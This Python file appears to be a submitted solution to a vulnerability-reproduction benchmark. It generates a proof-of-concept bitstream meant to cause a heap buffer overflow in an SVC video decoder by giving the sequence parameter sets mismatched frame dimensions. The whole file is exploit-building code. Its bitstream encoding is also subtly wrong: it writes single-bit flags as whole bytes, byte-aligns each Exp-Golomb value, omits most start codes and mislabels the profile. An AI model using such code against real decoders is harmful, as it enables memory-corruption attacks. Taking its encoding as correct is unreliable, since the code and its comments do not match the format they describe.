import os
import struct
import subprocess
import tempfile
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a heap buffer overflow in svcdec
        when decoder display dimensions don't match subset sequence dimensions.
        
        Strategy: Create a minimal valid SVC bitstream with mismatched dimensions.
        """
        
        # Ground truth length is 6180 bytes, but we'll create a shorter one
        # since shorter PoCs score higher per the formula
        
        # Create an SVC bitstream structure based on analysis of similar vulnerabilities
        # We'll create a minimal NAL unit structure with sequence and picture parameter sets
        # that contain mismatched dimensions
        
        poc = bytearray()
        
        # Start with NAL unit header (0x00 for unspecified, 0x00 for ref_idc=0)
        # We'll create a sequence parameter set NAL (type 7)
        nal_unit_type = 7  # SPS NAL unit
        nal_ref_idc = 3    # Highest priority
        nal_header = (nal_ref_idc << 5) | nal_unit_type
        poc.append(nal_header)
        
        # Profile IDC (baseline)
        poc.append(100)
        
        # Constraint flags (none)
        poc.append(0)
        
        # Level IDC (3.0)
        poc.append(30)
        
        # seq_parameter_set_id (ue(v))
        poc.extend(self.encode_ue(0))
        
        # log2_max_frame_num_minus4 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # pic_order_cnt_type (ue(v))
        poc.extend(self.encode_ue(0))
        
        # log2_max_pic_order_cnt_lsb_minus4 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # num_ref_frames (ue(v))
        poc.extend(self.encode_ue(1))
        
        # gaps_in_frame_num_value_allowed_flag (u(1))
        poc.append(0)
        
        # pic_width_in_mbs_minus1 (ue(v)) - This will be 39 for 640px (40 MBs - 1)
        # We set display width to 640
        poc.extend(self.encode_ue(39))
        
        # pic_height_in_map_units_minus1 (ue(v)) - This will be 44 for 720px (45 MBs - 1)
        # We set display height to 720
        poc.extend(self.encode_ue(44))
        
        # frame_mbs_only_flag (u(1)) - progressive
        poc.append(1)
        
        # direct_8x8_inference_flag (u(1))
        poc.append(1)
        
        # frame_cropping_flag (u(1)) - no cropping
        poc.append(0)
        
        # vui_parameters_present_flag (u(1)) - no VUI
        poc.append(0)
        
        # Now create a picture parameter set that specifies different dimensions
        # PPS NAL unit header
        nal_unit_type = 8  # PPS NAL unit
        nal_ref_idc = 3
        nal_header = (nal_ref_idc << 5) | nal_unit_type
        poc.append(nal_header)
        
        # pic_parameter_set_id (ue(v))
        poc.extend(self.encode_ue(0))
        
        # seq_parameter_set_id (ue(v))
        poc.extend(self.encode_ue(0))
        
        # entropy_coding_mode_flag (u(1))
        poc.append(0)
        
        # bottom_field_pic_order_in_frame_present_flag (u(1))
        poc.append(0)
        
        # num_slice_groups_minus1 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # Now add subset sequence parameter set for SVC
        # Subset SPS NAL unit header
        nal_unit_type = 15  # Subset SPS NAL unit
        nal_ref_idc = 3
        nal_header = (nal_ref_idc << 5) | nal_unit_type
        poc.append(nal_header)
        
        # Profile IDC (SVC)
        poc.append(83)  # SVC profile
        
        # Constraint flags
        poc.append(0)
        
        # Level IDC
        poc.append(30)
        
        # seq_parameter_set_id (ue(v))
        poc.extend(self.encode_ue(0))
        
        # chroma_format_idc (ue(v))
        poc.extend(self.encode_ue(1))
        
        # bit_depth_luma_minus8 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # bit_depth_chroma_minus8 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # qpprime_y_zero_transform_bypass_flag (u(1))
        poc.append(0)
        
        # seq_scaling_matrix_present_flag (u(1))
        poc.append(0)
        
        # log2_max_frame_num_minus4 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # pic_order_cnt_type (ue(v))
        poc.extend(self.encode_ue(0))
        
        # log2_max_pic_order_cnt_lsb_minus4 (ue(v))
        poc.extend(self.encode_ue(0))
        
        # num_ref_frames (ue(v))
        poc.extend(self.encode_ue(1))
        
        # gaps_in_frame_num_value_allowed_flag (u(1))
        poc.append(0)
        
        # pic_width_in_mbs_minus1 (ue(v)) - DIFFERENT from SPS: 79 for 1280px (80 MBs - 1)
        # This creates the mismatch: display says 640px, subset says 1280px
        poc.extend(self.encode_ue(79))
        
        # pic_height_in_map_units_minus1 (ue(v)) - DIFFERENT from SPS: 89 for 1440px (90 MBs - 1)
        # This creates the mismatch: display says 720px, subset says 1440px
        poc.extend(self.encode_ue(89))
        
        # frame_mbs_only_flag (u(1))
        poc.append(1)
        
        # direct_8x8_inference_flag (u(1))
        poc.append(1)
        
        # frame_cropping_flag (u(1))
        poc.append(0)
        
        # vui_parameters_present_flag (u(1))
        poc.append(0)
        
        # svc_vui_parameters_present_flag (u(1))
        poc.append(0)
        
        # additional_extension2_flag (u(1))
        poc.append(0)
        
        # Now add filler data to reach a size that triggers the overflow
        # The exact size needed depends on the implementation, but we aim for
        # something close to the ground truth (6180 bytes) but shorter
        
        # Add padding NAL units to trigger the overflow
        # Create slice NAL units that reference the mismatched dimensions
        for i in range(10):
            # Slice NAL unit header
            nal_unit_type = 1  # Coded slice of a non-IDR picture
            nal_ref_idc = 2
            nal_header = (nal_ref_idc << 5) | nal_unit_type
            poc.append(nal_header)
            
            # first_mb_in_slice (ue(v))
            poc.extend(self.encode_ue(0))
            
            # slice_type (ue(v)) - P slice
            poc.extend(self.encode_ue(0))
            
            # pic_parameter_set_id (ue(v))
            poc.extend(self.encode_ue(0))
            
            # frame_num (u(v)) - depends on log2_max_frame_num
            poc.append(0)
            
            # Add some macroblock data that will cause buffer overflow
            # when processed with wrong dimensions
            poc.extend(b'\x00' * 100)
            
            # Add random data to potentially trigger different code paths
            poc.extend(os.urandom(50))
        
        # Ensure the PoC is long enough to trigger the overflow but shorter than ground truth
        # We aim for ~3000 bytes which is significantly shorter than 6180
        current_len = len(poc)
        if current_len < 3000:
            # Add filler
            poc.extend(b'\x00' * (3000 - current_len))
        elif current_len > 4000:
            # Truncate if too long
            poc = poc[:4000]
        
        # Add final NAL unit terminator
        poc.extend(b'\x00\x00\x00\x01')
        
        # Add more random data to potentially trigger the overflow
        # The exact overflow trigger might need specific values at specific offsets
        poc.extend(os.urandom(500))
        
        return bytes(poc)
    
    def encode_ue(self, value):
        """Encode an unsigned exponential Golomb code."""
        value += 1
        bits = value.bit_length() - 1
        result = bytearray()
        
        # Write zeros for the prefix
        result.extend(b'\x00' * bits)
        
        # Write the value in binary
        mask = 1 << bits
        while mask:
            result.append(0x80 if (value & mask) else 0x00)
            mask >>= 1
        
        # Convert to byte string
        encoded = bytearray()
        current = 0
        bit_count = 0
        
        for bit in result:
            current = (current << 1) | (1 if bit else 0)
            bit_count += 1
            
            if bit_count == 8:
                encoded.append(current)
                current = 0
                bit_count = 0
        
        # Add remaining bits
        if bit_count > 0:
            current <<= (8 - bit_count)
            encoded.append(current)
        
        return encoded